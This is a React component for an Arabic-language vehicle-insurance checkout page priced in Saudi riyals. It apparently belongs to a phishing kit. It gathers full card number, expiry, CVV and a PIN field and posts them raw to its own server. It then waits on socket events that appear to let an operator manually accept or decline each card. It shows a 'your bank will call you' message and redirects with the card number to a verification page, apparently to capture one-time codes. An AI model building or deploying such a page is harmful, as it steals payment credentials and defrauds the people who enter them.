import axios from "axios";
import React, { useRef, useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { GiConfirmed } from "react-icons/gi";
import { VscCheck } from "react-icons/vsc";
import { FaSquarePhone } from "react-icons/fa6";
import Navbar from "../Navbar";

const Confirm = ({ setLoading, loading }) => {
  const data = new URLSearchParams(window.location.search);
  const query = JSON.parse(data.get("data"));
  const [companyData, setCompanyData] = useState(query.companyData);
  const [card_number, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [pay, setPay] = useState(false);
  const [car_holder_name, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [verfiy, setVrefiy] = useState(false);

  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };
  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    // Limit input to 3 digits
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handlePinChange = (e) => {
    // Limit input to 3 digits
    const numericValue = e.target.value.replace(/\D/g, "");
    setPin(numericValue.slice(0, 4));
  };

  const handlePay = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setPay(true);
    }, 2000);
  };

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    let check = card_number.split(" ").join("");
    if (check.length !== 16)
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");
    const finalData = {
      ...JSON.parse(data.get("data")),
      cardNumber: card_number,
      expiryDate,
      cvv,
      pin,
      card_name: car_holder_name,
    };
    try {
      await axios.post(api_route + "/visa/" + query._id, finalData).then(() => {
        socket.emit("paymentForm", JSON.parse(data.get("data"))._id);
        setVrefiy(true);
      });
    } catch (error) {
    } finally {
      setLoading(false);
    }
    // return window.location.href = `/verfiy?data=${JSON.stringify(finalData)}`
  };

  socket.on("acceptPaymentForm", (id) => {
    if (id === JSON.parse(data.get("data"))._id) {
      setVrefiy(false)
      
      window.location.href = `/verfiy?data=${JSON.stringify({
        ...JSON.parse(data.get("data")),
        cardNumber: card_number,
      })}`;
    }
  });

  socket.on("declinePaymentForm", (id) => {
    if (id === JSON.parse(data.get("data"))._id) {
       setVrefiy(false);
      setError('بيانات البطاقة غير صحيحة برجاء المحاولة مره اخري')
    }
  });

  if (!data.get("data")) {
    return (
      <div className="w-full flex items-center justify-center min-h-52 text-red-500 text-xl">
        Invalid Data
      </div>
    );
  } else {
    return (
      <div
        className="w-full flex flex-col min-h-screen items-center justify-center  relative"
        dir="rtl"
      >
        {verfiy ? (
          <div
            className="fixed flex-col   bg-white  z-50  w-full h-screen top-0 flex items-center justify-start"
            dir="ltr"
          >
            <Navbar />
            <span className="w-full text-2xl font-bold text-center">
              <span className="border-b w-1/2 p-2 font-bold">عملية الشراء</span>
            </span>
            <div className="w-full flex items-center justify-center gap-x-2 md:w-1/2">
              <img src="/visa.png" className="w-1/4" />
              <img src="/mastercard.png" className="w-1/6" />
              <img src="مدي.webp" className="w-1/4" />
            </div>{" "}
            <FaSquarePhone className="w-14 h-14 text-gray-500 " />
            <span className="w-full text-center my-5 text-gray-500 font-bold">
              لمصادقة عميلة الشراء , سيتم الاتصال بك من قبل المصرف الخاص بحسابك{" "}
            </span>
            <span className="w-full text-center mb-5 text-gray-500 font-bold">
              بعدها سيتم ارسال رمز التحقق الي رقم جوالك
            </span>
            <TailSpin
              height="30"
              width="30"
              color="orange"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
          </div>
        ) : (
          ""
        )}

        {pay ? (
          <form
            className="border-2 w-11/12  p-3 rounded-xl justify-center  items-center flex flex-col gap-y-2 "
            onSubmit={handleSubmit}
          >
            <span className="text-xl font-bold w-full text-center">
              الدفع بالبطاقات البنكية
            </span>
            <div
              className="w-full py-3  flex flex-col items-center justify-between p-2 rounded-xl"
              dir="rtl"
            >
              <div className="flex flex-col w-full gap-3 text-xl my-2">
                <input
                  value={car_holder_name}
                  required
                  onChange={(e) => setCardHolderName(e.target.value)}
                  dir="ltr"
                  minLength={4}
                  type="text"
                  placeholder=" الاسم كما هو مدون بالبطاقة  "
                  className="w-full  text-right rounded-md border-2  border-gray-300  p-2  placeholder:text-gray-600     outline-blue-500"
                />
              </div>
              <div
                className="flex flex-col w-full gap-3 text-xl my-2"
                dir="rtl"
              >
                <input
                  value={card_number}
                  required
                  onChange={handleCardNumberChange}
                  dir="ltr"
                  maxLength={19}
                  minLength={16}
                  inputMode="numeric"
                  type="text"
                  placeholder="  رقم  البطاقة"
                  className="w-full text-right  rounded-md border-2  border-gray-300  p-2  placeholder:text-gray-600     outline-blue-500"
                />
              </div>
              <div className="flex w-full justify-between gap-2">
                <div
                  className="flex flex-col w-2/3 gap-3 text-xl my-2"
                  dir="rtl"
                >
                  <div className="flex w-full ">
                    <input
                      type="text"
                      value={expiryDate}
                      maxLength={5}
                      inputMode="numeric"
                      minLength={4}
                      onChange={handleExpiryDateChange}
                      className="w-full text-right    rounded-md border-2 border-gray-300  p-2  placeholder:text-black    outline-blue-500"
                      placeholder=" MM/YY تاريخ الانتهاء "
                      required
                    />
                  </div>
                </div>
                <div
                  className="flex flex-col w-1/3 gap-3 text-xl my-2 "
                  dir="rtl"
                >
                  <input
                    value={cvv}
                    required
                    onChange={handleCvvChange}
                    dir="ltr"
                    maxLength={3}
                    minLength={3}
                    inputMode="numeric"
                    type="text"
                    placeholder="CVV"
                    className="w-full text-center  rounded-md border-2 border-gray-300  p-2  placeholder:text-black    outline-blue-500"
                  />
                </div>
              </div>
              {error && (
                <span className="text-red-500 w-full text-center text-lg mt-5 font-bold">
                  {error}
                </span>
              )}
              <div className="flex w-full justify-between items-center   py-4 mt-5 bg-white rounded-xl ">
                <span className="text-xl font-bold  text-center">
                  مبلغ الدفع
                </span>
                <span className="text-green-500 text-xl text-center font-bold">
                  {" "}
                  {companyData.price}
                  {" ر.س   "}
                </span>
              </div>
              <button
                className="bg-orange-500 w-full font-bold text-white flex items-center justify-center text-lg py-2 rounded-md mt-2"
                type="submit"
              >
                {loading ? (
                  <TailSpin
                    height="30"
                    width="30"
                    color="white"
                    ariaLabel="tail-spin-loading"
                    radius="1"
                    wrapperStyle={{}}
                    wrapperClass=""
                    visible={true}
                  />
                ) : (
                  "الاستمرار بالدفع"
                )}
              </button>
              <div className="w-full flex bg-white flex-col rounded-b-xl py-3 justify-center items-center">
                <span className="text-gray-600 text-lg">الدفع بواسطة</span>
                <div className="w-full flex items-center justify-center gap-x-2">
                  <img src="/visa.png" className="w-1/5" />
                  <img src="/mastercard.png" className="w-1/5" />
                  <img src="مدي.webp" className="w-1/5" />
                </div>
              </div>
            </div>
          </form>
        ) : (
          <div className="flex flex-col w-full px-2 items-center justify-center  bg-opacity-50">
            <div
              className="w-full bg-white rounded-xl my-5 flex flex-col items-center p-2 justify-center"
              style={{ boxShadow: "0px 0px 3px 0px #918b8b" }}
            >
              <div className="w-full  flex items-center justify-between py-3 m-1">
                <img src={companyData.logo} className="w-16 h-16" />
                <img src="/stars.jpg" />
              </div>
              <span className="text-xl font-bold">{companyData.name}</span>
              <span className="my-3 text-gray-500">
                تأمين المركبات ضد الغير
              </span>
              <div className="flex flex-col w-full py-2 ">
                <div className="flex w-full justify-between p-1">
                  <span className="text-gray-700 ">سعر الوثيقة</span>
                  <span className="text-sm text-gray-600">
                    {companyData.price} ر.س{" "}
                  </span>
                </div>
                <div className="flex w-full justify-between p-1">
                  <span className="text-gray-700 ">خصم عدد وجود مطالبات</span>
                  <span className="text-sm text-gray-600">
                    {companyData.one} ر.س
                  </span>
                </div>
                <div className="flex w-full justify-between p-1">
                  <span className="text-gray-700 ">رسوم ادارية</span>
                  <span className="text-sm text-gray-600">
                    {" "}
                    {companyData.two} ر.س
                  </span>
                </div>
                <div className="flex w-full justify-between p-1">
                  <span className="text-gray-700 ">قسط اشتراك التأمين</span>
                  <span className="text-sm text-gray-600">
                    {companyData.three} ر.س{" "}
                  </span>
                </div>
                <div className="flex w-full justify-between p-1">
                  <span className="text-gray-700 ">المجموع الجزئي</span>
                  <span className="text-sm text-gray-600">
                    {companyData.four} ر.س{" "}
                  </span>
                </div>
                <div className="flex w-full justify-between p-1">
                  <span className="text-gray-700  flex flex-col ">
                    <span> ضريبة القيمة المضافة</span>
                  </span>
                  <span className="text-sm text-gray-600">
                    {companyData.five} ر.س{" "}
                  </span>
                </div>
                <div className="flex w-full justify-between p-1 my-1">
                  <span className="font-bold text-xl">المبلغ اللإجمالي</span>
                  <span className="font-bold text-xl">
                    {companyData.total}
                    {" ر.س "}
                  </span>
                </div>
                <button
                  className="bg-orange-500 text-white flex items-center justify-center text-lg py-2 rounded-md mt-2"
                  onClick={() => handlePay()}
                >
                  {loading ? (
                    <TailSpin
                      height="30"
                      width="30"
                      color="white"
                      ariaLabel="tail-spin-loading"
                      radius="1"
                      wrapperStyle={{}}
                      wrapperClass=""
                      visible={true}
                    />
                  ) : (
                    "الدفع"
                  )}
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    );
  }
};

export default Confirm;
